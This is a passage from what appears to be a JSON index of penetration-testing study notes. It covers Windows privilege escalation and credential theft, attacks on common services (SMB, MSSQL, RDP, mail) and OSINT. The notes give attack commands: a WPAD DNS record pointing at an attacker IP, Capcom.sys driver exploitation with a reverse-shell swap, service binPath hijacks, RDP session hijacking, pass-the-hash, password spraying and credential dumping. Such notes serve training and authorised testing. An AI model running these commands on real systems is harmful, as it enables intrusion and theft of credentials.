the WPAD Records :PS &gt; Add-DnsServerResourceRecordA -Name wpad -ZoneName DOMAIN.local -ComputerName dc01.DOMAIN.local -IPv4Address OUR_ATTACKER_IPPrint OperatorsMembers of this group can manage, create, share, and delete printers that are connected to domain controllers in the domain. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain. This grant their user the SeLoadDriverPrivilege privilege.First we can use the EnableSeLoadDriverPrivilege tool to enable the privilege and load the driver. You can add the following includes at the begining of the file :#include &lt;windows.h&gt;#include &lt;assert.h&gt;#include &lt;winternl.h&gt;#include &lt;sddl.h&gt;#include &lt;stdio.h&gt;#include \"tchar.h\"You can compile the .cpp file in Visual Studio using the following command : cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp.Now you have to upload this Capcom.sys file and add a reference to this driver under our HKEY_CURRENT_USER tree :reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Users\\Public\\Downloads\\Capcom.sys\"reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1We can use the DriverView.exe tool to see if the Capcom.sys driver is loaded or not.PS &gt; .\\DriverView.exe /stext drivers.txtPS &gt; cat drivers.txt | Select-String -pattern CapcomIf the second command doesn’t give you any output, it means that the driver is not loaded. You can run the program that you have compiled earlier :EnableSeLoadDriverPrivilege.exeIf you run the previous commands, you will now see that the Capcom.sys driver is now loaded.You can now use this PoC to exploit the Capcom.sys. If you don’t have a GUI connection to the windows machine, you may not be able to execute the previous exploit. You can modify it by replacing the call of the cmd.exe in the LaunchShell by a call to a reverse shell executable that you created before compiling ExploitCapcom.cpp. The line should look like TCHAR CommandLine[] = TEXT(\"C:\\\\ProgramData\\\\MyReverseShell.exe\");.You can automate all this process with this exploit and then run the ExploitCapcom.exe to pop us a SYSTEM shell :EoPLoadDriver.exe System\\CurrentControlSet\\Capcom C:\\Users\\Public\\Downloads\\Capcom.sysServer OperatorsMembers in the Server Operators group can administer domain controllers. This group exists only on domain controllers. By default, the group has no members. Members of the Server Operators group can perform the following: sign in to a server interactively, create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer, and shut down the computer. This group cannot be renamed, deleted, or moved. Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.We need to find a service that start as SYSTEM. We can do it by using the sc qc SERVICE_NAME command or the PsService as follows :PsService.exe security SERVICE_NAMEIf the Server Operators group has privileges over this service we should see something like :[ALLOW] BUILTIN\\Server Operators AllNow that we know which service to exploit, we can change its binary path to execute a command like a reverse shell or adding our user to a certain group :sc config SERVICE_NAME binPath= \"cmd /c net localgroup Administrators OUR_USER /add\"We will get an error when starting the service because of the previous command. But when the error is prompted check your listener or in which group you are in. You should see that the previous command worked :sc start SERVICE_NAME If the service is already running, you can stop it with the sc stop SERVICE_NAME command. Now that we have complete access to the domain controller, we can use crackmapexec to dump admin credentials, for example.OS AttacksChecking Weak ACLWe can check if there are binaries with weak ACL permission with the SharpUp executable :PS &gt; .\\SharpUp.exe auditWith the result gathered with the SharpUp command, we can sharpen our results with the icalcs command :PS &gt; icacls \"C:\\PATH\\TO\\THE\\FILE.exe\"When you find a vulnerable service you can replace the executable by your own (shell, reverse shell, add your user to admin group…) and then launch the service :sc start SERVICE_NAME Don’t forget to make a copy of the executable you are replacing not to break the environment and get back to the initial state after your assessment.You can also use the Accesschk command to check for file permissions of the service :accesschk.exe /accepteula SERVICE_NAMEIf you have enough rights, you can change the path of the binary as in the Server Operators section.Unquoted Service PathThe registry configuration establishes a path to the binary that must be run when a service is started after it is installed. Windows will make an attempt to locate this binary in several locations if it is not enclosed in quotes.You can search for unquote service path manualy withe the sc qc SERVICE_NAME or automatically with the command :wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"If we find a service which has the path C:\\Program Files (x86)\\My Service\\MyService.exe, then, Windows will try to locate C:\\Program.exe or C:\\Program Files (x86)\\My.exe because the path isn’t between quotes. So if we have enough rights to put a malicious executable in those places, we could hijack the service.Kernel ExploitMost of the Windows kernel exploit have their own CVE and PoC so I’m not going to go in depth with them but here is a list of some of them : MS16-032 MS16-135 MS17-010 CVE-2017-0213 Hot Potato SmashedPotatoCredential TheftOnce we arrive on a machine, we may want to look for credentials. Either they are still in some history or in some files. Some people put their password in some file in clear-text and we can find those by searching the keyword password :PS &gt; findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml The /M option in /SIM can be removed to print the content of the file. The above command will only display file names. The /i or /p flags can be added to respectively ignores the case of the characters when searching for the string and skip files with non-printable characters. For more information about findstr flags, you can check its manualFile ExtensionsYou can look for interesting file based on their name and/or their extension. Here are some example on how to do so :dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*where /R C:\\ *.configPS &gt; Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction IgnoreSticky Notes PasswordsSticky Notes is a basic Windows app that allows you to take notes and save them on your computer. Those notes are saved as information in a database and are located in :C:\\Users\\USERNAME\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqliteWe can copy all plum.sqlite* files down to our system and open them with a tool such as DB Browser for SQLite and view the Text column in the Note table with the query :SELECT Text FROM Note;This can also be done with PowerShell using the PSSQLite module :PS &gt; Set-ExecutionPolicy Bypass -Scope Process&lt;SNIP&gt;[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is \"N\"): APS &gt; cd .\\PSSQLite\\PS &gt; Import-Module .\\PSSQLite.psd1PS &gt; $db = 'C:\\Users\\Bob\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite'PS &gt; Invoke-SqliteQuery -Database $db -Query \"SELECT Text FROM Note\" | ft -wrapChrome Dictionary FilesWe also can find clear-text passwords in Google dictionary files. Sensitive information, such as passwords, may be submitted via a browser-based application or email client, which highlights any terms it doesn’t understand. In order to eliminate the annoying red underlining, the user may add these words to their dictionary.PS &gt; gc 'C:\\Users\\Bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String passwordUnattended Installation FilesAuto-logon settings or additional accounts that will be established as part of the installation may be defined via unattended installation files. The unattend.xml file stores passwords either in plaintext or base64-encoded form.PowerShell History FileIn Powershell 5.0 and higer, its history is stored in this file :C:\\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtWe can confirm that this is the real path using Powershell :PS &gt; (Get-PSReadLineOption).HistorySavePathTo read the content of this history file, we can use type FILE_TO_READ or the gc command :PS &gt; gc (Get-PSReadLineOption).HistorySavePathTo list history of all users that we have access as our current one, we can use this one-liner :PS &gt; foreach($user in ((ls C:\\users).fullname)){cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}Saved CredentilasWe can list users that have saved their credentials using the command cmdkey /list. Now that we know which user have saved their credentials, we can run command as them :PS &gt; runas /savecred /user:DOMAIN\\USER \"COMMAND HERE\"Browser CredentialsTo retreive browser saved credentials, we can use tools such as SharpChrome :PS &gt; .\\SharpChrome.exe logins /unprotectAutomated ToolsLaZagneThe LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.PS &gt; .\\lazagne.exe allEmailUsing the program MailSniper, if we are able to log into a domain-joined system as a domain user with a Microsoft Exchange mailbox, we can try to search the user’s email for words like “pass,” “creds,” “credentials,” etc.SessionGopherTo extract saved WinSCP, FileZilla, SuperPuTTY, PuTTY, and RDP credentials, we can use SessionGopher. The PowerShell-written utility looks for and decrypts remote access tool saved login credentials. It can be executed remotely or locally. It looks up and decrypts any session data it can find by searching the HKEY USERS hive for all users who have logged into a domain-joined (or standalone) host. Additionally, it may be used to search disks for RSA (.sdtid), Remote Desktop (.rdp), and PuTTY private key files (.ppk).PS &gt; .\\SessionGopher.ps1 PS &gt; Invoke-SessionGopher -Target MACHINE_NAME o_ / \". SessionGopher ,\" _-\" ,\" m m ..+ ) Brandon Arvanaghi `m..m Twitter: @arvanaghi | arvanaghi.com [+] Digging on MACHINE_NAME...&lt;SNIP&gt;Wifi PasswordsWe can use the netsh command to show us password of Wifi networks we already connected to. We can first list recent Wi-Fi connections :netsh wlan show profileAnd then, we can list the password for a specific Wi-Fi :netsh wlan show profile WIFI_NAME key=clearMount VHDX/VMDKTools such as Snaffler can show us some interesting files such as .vhd, .vhdx, and .vmdk files. These are Virtual Hard Disk, Virtual Hard Disk v2 (both used by Hyper-V), and Virtual Machine Disk (used by VMware). These three files can be mounted on either our local Linux attack machine or Windows attack machine if we come across any of them. The next commands allow us to mount a share from our Linux attack box or copy across one of these files, allowing us to browse the various operating system files and folders as if we were logged in.guestmount -a FILE_NAME.vmdk -i --ro /mnt/vmdkorguestmount --add FILE_NAME.vhdx --ro /mnt/vhdx/ -m /dev/sda1On our Windows machine we can simply right-click on the file we want to mount and click on the Mount option." }, { "title": "Notes | Common Services Enumeration & Attacks", "url": "/Notes/Footprinting/Common_Services_Enumeration_&_Attacks", "categories": "Notes, Footprinting, Common Services Enumeration& Attacks", "tags": "Common Services, Enumeration, Web, FTP, SMB, SMTP, POP3", "date": "2022-09-02 00:00:00 +0200", "snippet": "Common Services EnumerationWeb EnumerationWhen you are looking at a web interface there is basically 3 things I advise you to do : Read page content to find useful information Read source code to find dev comments or information about plugins Fuzz the website to find interesting files and/or directoriesI’ll leave you with the reading part and now we are going to look for the fuzzing part. It may not be very “stealthy” on a real live environment but it’s pretty common in CTFs. If you like GUI, you can check the Zap tool and especialy the spider/crawler section. But I’m going to go more in depth with two non graphical tools, ffuf and gobuster.Ffuf / Gobusterffuf is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing. And Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains. Note that there are many other fuzzing tools and that I’m only presenting ffuf and gobuster. You may want to use dirbuster (Graphical user interface) or dirbWeb EnumerationFirst we are going to look for web pages and directories.On gobuser you can find directories and web pages like this :gobuster dir -u http://SITE -w WORDLIST -x txt,php,html I advise you to use the /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt wordlist as a first attempt to find files or directories.On ffuf you can do so like this :ffuf -u http://SITE/FUZZ -w WORDLIST -e .txt,.php,.html You can use recursion depth to look for files and directories in directories you find with fuff by adding the -recursion -recursion-depth 1 option (it will do a recursion of 1 depth but you can increase this amount) On both tools you can increase the scan speed by increasing the number of threads with the -t X option. Just replace the X with the number of threads that you want. I advise you not to go over 50 because it may cause errors or overheat the server. The web fuzzing we have done can also be done with the intruder of Burp Suite.POST / GET FuzzingWith fuff you can fuzz POST and GET parameters. The easiest parameter to fuzz is the GET parameter because it’s very similar to a web page or directory fuzzing.ffuf -u http://SITE/?id=FUZZ -w WORDLIST orffuf -u http://SITE/?FUZZ=key -w WORDLIST This should result in many errors so you can stop it and rerun it with the -fs XXX option where XXX is the size you found on error results.For the POST fuzzing parameter you can do it with the -d \"PARAM=FUZZ or -d \"FUZZ=VAL:-X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'Vhost &amp; SubdomainsWe already have seen how to discover VHosts in the OSINT module. For subdomain enumeration it’s much like POST and GET fuzzing :ffuf -u https://FUZZ.example.com/ -w WORDLIST If you don’t have it yet you can download Seclists with sudo apt install seclists. You will find a lot of wordlist and the ones we are interested in here are the ones in the /usr/share/seclists/Discovery/DNS/ directory. The subdomains-top1million-110000.txt is a pretty complete. As you can see, ffuf is pretty versatile tool and can basically fuzz anything. You can also use it for brute force if you want, for example.FTPFile Transfert Protocol (FTP) is a standard communication protocol used for the transfer of files from a server to a client. To connect to an FTP server we can use the ftp IP -P PORTcommand. The default FTP port is 21 so if you have the same port for the FTP server on the machine you are attacking then you don’t have to specify the -P flag. When you run the command, you will be asked to connect with a username and password. If you don’t have such things, you can try to use the default anonymous user without a password. The anonymous connexion should be disabled but it’s worth trying. The -sC of nmap can list files if anonymous login is enabled. There may be hidden files so don’t forget the -a flag of the ls command. The -R flag can also become handy to list files recursively.On an FTP server you can’t read files like on a normal machine with cat or your preferred text editor. You’ll have to download the file to read it locally. To download a file you can use the get FILE command and to upload a file the put FILE command. Whether it is for the get or the put command the default directory will be the one where the ftp command was launched. If you launched the command on the Desktop the files will be downloaded here and if the file you want to upload isn’t on the desktop then you will need to specify its path. If you want information about FTP brute forcing you can check this linkSMB“Server Message Block (SMB) is a communication protocol originally developed in 1983 by Barry A. Feigenbaum at IBM[2] and intended to provide shared access to files and printers across nodes on a network of systems running IBM’s OS/2.” Wikipedia. Originaly SMB used port 139 but in more recent version you can see port 445.List SharesWhen you know that the machine has a SMB service running you may want to know which shares is available / readable. smbclient and smbmap are two great tools for this purpose.smbclient -N -L \\\\\\\\IP Note the -N flag that we use to specify no password and the -L option to list all shares. If you have already a user, you can specify it with the -U flag.orsmbmap -H IP To specify a user and or password with smbmap you can use the -u and -p flags. If you want to list files from a share recursively with smbmap you can use the -r SHARE flag (replace SHARE with the share you want to list).Access SharesNow that we know the shares we want to read, we can connect to the share folder.smbclient -U USER \\\\\\\\IP\\\\SHARE_NAMEOnce connected, we can download or upload files like we’ve seen in the FTP section with get and put. You can also use the cd and ls command to move in the share. With smbmap you can use the --download PATH/TO/FILE flag to download a file and the --upload SOURCE DESTINATION flag to upload a file. You can execute command on the share with smbmap with the -x \"COMMAND\" flag.Where password brute force may cause damage on the server (block accounts) we are attacking, passwords spraying can be stealthier and cause fewer damages. Instead of brute forcing a password we can try to find users with passwords very often used. You also can perform pâssword spraying with Hydracrackmapexec smb IP -u USER_LIST -p 'Company01!' When you found valid credentials you can try dumping credentials with crackmapexec using the --sam, --lsa or the --ntds flag.NFSNetwork File System (NFS) is pretty similar to SMB but you can find the main differences in this article.It’s running on port 111 but since it’s last version (NFSv4) it uses one UDP and TCP port 2049. You can use the --script nfs* flag to have more details about the NFS shares in your nmap scan.If you want to manually check for shares on a server, you can use the showmount command as follows :showmount -e IPNow that you know the share name, you can mount it on your device by following this steps : Create a directory where the share is going to be mounted : mkdir NFS_SHARE_DIR Mount the remote share on your machine : mount -t nfs IP:REMOTE_SHARE ./NFS_SHARE_DIR/ Navigate and enumeate your mounted share cd NFS_SHARE_DIR If you want to dismount your newly created mounted share you can use the umount command like : umount ./NFS_SHARE_DIRSQLThere are many database management system (DBMS) but by default MSSQL uses port TCP/1433, and MySQL uses TCP/3306.ConnectionTo connect to MySQL and MSSQL is pretty similar. MySQL :Linuxmysql -h DOMAIN_OR_IP -u USERNAME -pPASSWORD -P PORT DATABASE Note the if you don’t know the databases that are on the host you can omit this parameter and select it after. Note that there is no space between the -p flag and the password. You can use the -p flag without specifying the password at first and type it when asked.Windowssqlcmd -S DOMAIN_OR_IP -U USERNAME -P 'PASSWORD' -y 30 -Y 30 The -y and -Y flag are used for better looking output. MSSQL :sqsh -S DOMAIN_OR_IP -U SERVERNAME\\\\USERNAME -P 'PASSWORD' -h If you are looking for a local account you can put .\\\\USERNAME instead of giving a servername.SQL CommandsFor the commands we will use, the mysql commands are easier to type and remember.Show databases MySQL :SHOW DATABASES; MSSQL :1&gt; SELECT name FROM master.dbo.sysdatabases2&gt; goSelect a Database MySQL :USE DATABASES; MSSQL :1&gt; USE name FROM master.dbo.sysdatabases2&gt; goShow Tables MySQL :SHOW TABLES; MSSQL :1&gt; SELECT table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES2&gt; go Don’t forget to specify the DATABASE_NAME in MSSQL.Select all Data from a Table MySQL :SELECT * FROM TABLE_NAME MSSQL :1&gt; SELECT * FROM TABLE_NAME2&gt; goExecute CommandsWith MSSQL you can execute command with xp_cmdshell by typing xp_cmdshell \"COMMAND\".1&gt; xp_cmdshell 'whoami'2&gt; goNote that if xp_cmdshell is not enable and if you have sufficient rights you can enable it with the following commands : To allow advanced options to be changed.1&gt; EXECUTE sp_configure 'show advanced options', 12&gt; go To update the currently configured value for advanced options.1&gt; RECONFIGURE2&gt; go To enable the feature.1&gt; EXECUTE sp_configure 'xp_cmdshell', 12&gt; go To update the currently configured value for this feature.1&gt; RECONFIGURE2&gt; goImpersonate Existing Users with MSSQLThe executing user can take the permissions of another user thanks to a particular privilege in SQL Server called IMPERSONATE.We must first find users who we can mimic. Sysadmins have the ability to impersonate anybody by default, but rights must be specifically granted to non-administrator users. In order to find users we can impersonate, we may perform the following query:1&gt; SELECT distinct b.name2&gt; FROM sys.server_permissions a3&gt; INNER JOIN sys.server_principals b4&gt; ON a.grantor_principal_id = b.principal_id5&gt; WHERE a.permission_name = 'IMPERSONATE'6&gt; GONow if the user bob can be impersonate, we will execute the following command :1&gt; EXECUTE AS LOGIN = 'bob'2&gt; SELECT SYSTEM_USER3&gt; SELECT IS_SRVROLEMEMBER('sysadmin')4&gt; goCommunicate with Other Databases with MSSQLLinked servers is a configuration option in MSSQL. A Transact-SQL query that contains tables from another instance of SQL Server, or another database product like Oracle, may generally be executed by the database engine thanks to linked servers, which are typically set up to support this. Identify linked Servers in MSSQLThe following command will list linked server and mark remote servers with a 1 and local ones with a 0.1&gt; SELECT srvname, isremote FROM sysservers2&gt; goTo execute commands on a linked server you can use the following command :EXECUTE ('CMD') AT [LINKED.SRV]\tWhere CMD can be a SQL querry or xp_cmdshell like this :EXECUTE('xp_cmdshell ''type c:\\Users\\Administrator\\Desktop\\flag.txt''') AT [LINKED.SRV] Note that the single quotes (') are important !RDP“Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.” (Wikipedia). By default, the server listens on TCP and UDP on port 3389.RDP Password SprayingIf we are looking for usernames we may try the password spraying attack. As for any password spraying attack we can use Hydra but for RDP we can also use crowbar. The crowbar syntax is as follows if we want to spray the password password123 on the whole network :crowbar -b rdp -s IP/32 -U USER_LIST -c 'password123'RDP connectionWhen you find yourself with valid credentials, you can connect to the distant machine using tools like freerdp or remmina. The full xfreerdp command where we share a local folder to upload our tools is as follows :xfreerdp /v:IP:PORT /u:USERNAME /p:PASSWORD /drive:SHARENAME,\"PATH_TO_THE_FILES_TO_SHARE\"RDP Session HijackingIf we obtain access to a computer and have a local administrator account. The user’s remote desktop session can be hijacked in order to elevate our privileges and assume the user’s identity if they are connecting via RDP to our hacked system. In an Active Directory setting, this can lead to us taking control of a Domain Admin account or gaining more access to the domain.We can use the Powershell command query user to look for other connected users. If you already have a SYSTEM CMD opened you can lauch the command tscon TARGET_SESSION_ID /dest:OUR_SESSION_NAME. If you don’t have a SYSTEM CMD you can create a service that, by default, will run as local SYSTEM :sc.exe create sessionhijack binpath= \"cmd.exe /k tscon TARGET_SESSION_ID /dest:OUR_SESSION_NAME\"This will launch our service called sessionhijack.net start sessionhijackRDP Pass-the-Hash (PtH)What is wonderful with RDP is that even if we only have the NT hash and not the clear text password, we can still connect to the machine with the Pass-the-Hash technique. To use xfreerdp fot the PtH attack you can do :xfreerdp /v:IP /u:USER /pth:HASHThis attack is only possible if the Restricted Admin Mode is enabled (it is disabled by default). A new registry key DisableRestrictedAdmin (REG DWORD) under HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa can be added to enable this. The command below can be used to accomplish it:reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /fSMTP / POP3 / IMAPAll those protocols are used to allow people to receive and send mails. You can find the list of ports that they are using here : Port Service TCP/25 SMTP Unencrypted TCP/143 IMAP4 Unencrypted TCP/110 POP3 Unencrypted TCP/465 SMTP Encrypted TCP/993 IMAP4 Encrypted TCP/995 POP3 Encrypted Either for SMTP or POP3 server you can try to brute force them or password spray them using hydraSMTPYou can easily connect to a SMTP server with telnet using the command telnet IP 25. You can use the commands VRFY, EXPN, and RCPT TO to enumerate users on the server.The VRFY command allows us to check for existing users and can be used like this VRFY root. If the user root exist, then we will see a line containing this username like 250 USERNAME. If the user isn’t found we may get the error code 252.The EXPN command will list all users of a certain list. For example, if we type EXPN batbato we will get my email but if we type EXPN students we may get all emails that belongs to students.RCPT TO can be used to check the recipient of a mail. We try to send a mail to many users in order to find valid ones.MAIL FROM: Anyone@X.com250 OK - (Server acknowledges and accepts)RCPT TO: bob@X.dom250 OKHere we can see that bob is a valid user.You can use tools such as smtp-user-enum to automate this process. The -M flag allows us to specify the method we want to use (VRFY, RCPT or EXPN).smtp-user-enum -M RCPT -U USER_LIST -D DOMAIN -t IP You also can use tools such as Metaploit to automate your process. You can use modules like auxiliary/scanner/smtp/smtp_version or auxiliary/scanner/smtp/smtp_enum.POP3The POP3 can also be used to enumerate users. We can do so by using the USER command as follows :USER bob+OKUSER bib-ERRThe most useful commands are USER and PASS to connect to the server, LIST to list mails and RETR X to get the content of the mail X.\tBut here is a list of useful POP3 commands : Command Description USER username Identifies the user. PASS password Authentication of the user using its password. STAT Requests the number of saved emails from the server. LIST Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA Requests the server to display the server capabilities. RSET Requests the server to reset the transmitted information. QUIT Closes the connection with the POP3 server. You can find more information about POP3 commands on this site.IMAPAs for SMTP and POP3 you can execute bunch of commands on a IMAP server, here is a list of some that may help you : Command Description 1 LOGIN username password User’s login. 1 LIST “” * Lists all directories. 1 CREATE “INBOX” Creates a mailbox with a specified name. 1 DELETE “INBOX” Deletes a mailbox. 1 RENAME “ToRead” “Important” Renames a mailbox. 1 LSUB “” * Returns a subset of names from the set of names that the User has declared as being active or subscribed. 1 SELECT INBOX Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX Exits the selected mailbox. 1 FETCH &lt;ID&gt; all Retrieves data associated with a message in the mailbox. tag FETCH &lt;ID&gt;:&lt;ID&gt; (BODY[HEADER]) Get header of message tag FETCH &lt;ID&gt; (BODY[n]) Get the part number n of the body 1 CLOSE Removes all messages with the Deleted flag set. 1 LOGOUT Closes the connection with the IMAP server. POP3s &amp; IMAPsIf we encounter the encrypted version of POP3 and IMAP, we still can connect to it but not with telnet. We can do so by using openssl :openssl s_client -connect IP:pop3s You can replace pop3s by imaps to connect to a IMAPs server." }, { "title": "Notes | OSINT", "url": "/Notes/Footprinting/OSINT", "categories": "Notes, Footprinting, OSINT", "tags": "DNS, Enumeration, OSINT, Information Gathering", "date": "2022-08-31 00:00:00 +0200", "snippet": "OSINTOpen Source INTeligence refers to the gathering and analysis of information from open sources to create useful intelligence. In a classic penetration test it will be our first step but in CTF we may not need this if we only have a machine to pwn. This skill is very important because it allows us to get a better understanding of the network we are facing.Passive Information GatheringOur first step will be Passive Information Gathering. Indeed, we don’t want to be spotted by our client from the start so first we are going to act like any other user or service (clicking links, navigating on websites, check for DNS entries…).WHOISWHOIS is a query and response protocol that is popularly used for accessing databases that list the registered users or assignees of Internet resources, including domain names, blocks of IP addresses, or autonomous systems, but is also used for a larger range of other information.We are going to use this command on the github website. This command will allows us to get mails, phone numbers, name servers and much more.└─$ whois github.com Domain Name: GITHUB.COM Registry Domain ID: 1264983250_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.markmonitor.com Registrar URL: http://www.markmonitor.com Updated Date: 2020-09-08T09:18:27Z Creation Date: 2007-10-09T18:20:50Z Registry Expiry Date: 2022-10-09T18:20:50Z Registrar: MarkMonitor Inc. Registrar IANA ID: 292 Registrar Abuse Contact Email: abusecomplaints@markmonitor.com Registrar Abuse Contact Phone: +1.2086851750 Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited Name Server: DNS1.P08.NSONE.NET Name Server: DNS2.P08.NSONE.NET Name Server: DNS3.P08.NSONE.NET Name Server: DNS4.P08.NSONE.NET Name Server: NS-1283.AWSDNS-32.ORG Name Server: NS-1707.AWSDNS-21.CO.UK Name Server: NS-421.AWSDNS-52.COM Name Server: NS-520.AWSDNS-01.NET DNSSEC: unsigned &lt;SNIP&gt; Note that this command is also available on windows CMDDNS“You talked about DNS but what is this ?”. Domain Name System is a service (running on port 53) that allows us to look for github.com instead of its IP. For us, human, it’s easier to remember words that IPs that are succession of numbers. Where us are going to read the FQDN github.com, DNS are going to start with the com and then github. For more information about DNS you can check this videoNSLOOKUP and DIGThe nslookup command allows us to query name server of a domain. We can get IPs of the domain we are looking for :└─$ nslookup github.com Server: 192.168.111.2Address: 192.168.111.2#53Non-authoritative answer:Name: github.comAddress: 140.82.121.3The dig command is very similar to nslookup. We can specify a name server with the syntax @name_server:└─$ dig github.com ; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; github.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41519;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232; COOKIE: 77571a6e301260fd01000000630f655833f8151aea163960 (good);; QUESTION SECTION:;github.com. IN A;; ANSWER SECTION:github.com. 5 IN A 140.82.121.3;; Query time: 28 msec;; SERVER: 192.168.111.2#53(192.168.111.2) (UDP);; WHEN: Wed Aug 31 09:43:28 EDT 2022;; MSG SIZE rcvd: 83With both nslookup and dig we can query DNS records (TXT, A, AAAA, MX…). With nslookup you just have to add the -query= flag followed by the DNS record you want to query (ex: nslookup -query=TXT TARGET. We can do the same with dig by adding the DNS record after the dig command like : dig AAAA TARGET.Google Dorking Symbol / Syntax Function \"search phrase\" Find results with exact search phrase OSINT filetype:pdf Find files of type PDF related to a certain term (here OSINT). salary site:example.com Limit search results to a specific site. pentest -site:example.com Exclude a specific site from results walkthrough intitle:example Find pages with a specific term in the page title (here walkthrough). challenge inurl:example Find pages with a specific term in the page URL (here challenge). OthersYou can search for useful information on the victim websites, look for employees on their social media accounts (Facebook, Twitter, LinkedIn…).Many other automated tools exist like the following one : Name Usefulness Virus Total DNS information gathering Censys Certificates information gathering CRT Certificates information gathering osintframework Lots of useful tools The Harvester Gather emails, names, subdomains, IP addresses, and URLs The Way Back Machine Access to older version of a website and possibly removed content Shodan Look for IoT arround the world WhatsMyName Username finder Sherlock Username finder Hunter.io Mail finder Wigle Retrieve information about a WIFI Maltego Information gathering about a company or a person (can become active info gathering) Recon-ng Web enumeration gatherer Active Information GatheringNow that we have some informations about our target we may want to get more but this time by interacting with their systems.Web Information GatheringWith WhatWeb you can get information about the web server (including CMS if one is used), Wappalyzer will display this result directly on the navigator and WafW00f will gives us informations about the firewall in place.Subdomain EnumerationA secondary DNS server receives information from the primary DNS server and changes it through a zone transfer. A domain’s DNS servers are organized using the master-slave model, with the slave getting updated DNS data from the master DNS. Zone transfers from secondary (slave) DNS servers should be permitted by the master DNS server, although this might be misconfigured.You can find Zone Transfer example here. You can use the dig or the nslookup command for this. Here is an example with the nslookup command because on the previously mantioned website we can see it with the dig command:nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja&lt;SNIP&gt;Server: nsztm1.digi.ninjaAddress: 81.4.108.41#53printsection()zonetransfer.me origin = nsztm1.digi.ninja mail addr = robin.digi.ninja serial = 2019100801 refresh = 172800 retry = 900 expire = 1209600 minimum = 3600zonetransfer.me hinfo = \"Casio fx-700G\" \"Windows XP\"zonetransfer.me text = \"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\"zonetransfer.me mail exchanger = 0 ASPMX.L.GOOGLE.COM.zonetransfer.me mail exchanger = 10 ALT1.ASPMX.L.GOOGLE.COM.zonetransfer.me mail exchanger = 10 ALT2.ASPMX.L.GOOGLE.COM.zonetransfer.me mail exchanger = 20 ASPMX2.GOOGLEMAIL.COM.zonetransfer.me mail exchanger = 20 ASPMX3.GOOGLEMAIL.COM.zonetransfer.me mail exchanger = 20 ASPMX4.GOOGLEMAIL.COM.zonetransfer.me mail exchanger = 20 ASPMX5.GOOGLEMAIL.COM.&lt;SNIP&gt;You can also list subdomains with the gobuster tool like this :gobuster dns -q -r NS_SERVER_NAME -d DOMAIN -w WORDLISTVirtual Hosts DiscoveryMultiple domain names can be hosted on a single server using the virtual hosting technique (each name is handled separately) . By doing this, one server may share resources like memory and processing time without having that each service it offers have the same host name.We can use the Ffuf tool to do so. First we need to know the size of response that doesn’t exist. You can do so by using BurpSuite, cURL or just launching ffuf and stop it after a few seconds just to get the size of the vhost that doesn’t exist and put it after the -fs flag.ffuf -w WORDLIST -u http://SITE -H \"HOST: FUZZ.DOMAIN.com\" -fs NUMBERGEOINT / IMINTThis skills may not be usefull when working in a company but can be utile in CTFs or for national agencies. GEOINT is an intelligence field that uses geospatial information and data to define, evaluate, and visually represent physical characteristics and geographically based actions on Earth. Whereas IMINT is a discipline of intelligence collection that analyzes imagery to find information with intelligence value.In those disciplines, you need to pay attention to every detail (languages of signs, stores, licence plates…). A very useful tool is Yandex. It’s the Russian version of Google but their AI to analyse images is much more powerful." }, { "title": "Notes | Port Enumeration", "url": "/Notes/Footprinting/Port_Enumeration", "categories": "Notes, Footprinting, Port Enumeration", "tags": "Web, Fuzzing, Ports, Enumeration, Nmap", "date": "2022-08-30 00:00:00 +0200", "snippet": "Port EnumerationCapture The Flag (CTF) are challenges that allows us to train 